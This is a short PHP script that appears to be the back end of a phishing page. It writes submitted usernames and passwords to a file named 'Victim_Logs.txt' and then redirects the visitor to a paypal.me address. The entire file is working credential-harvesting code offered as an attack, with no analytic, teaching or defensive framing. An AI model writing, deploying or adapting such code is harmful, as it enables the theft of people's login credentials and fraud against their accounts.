<?php

file_put_contents("Victim_Logs.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.me/OfficialEvilDevil/');
exit();
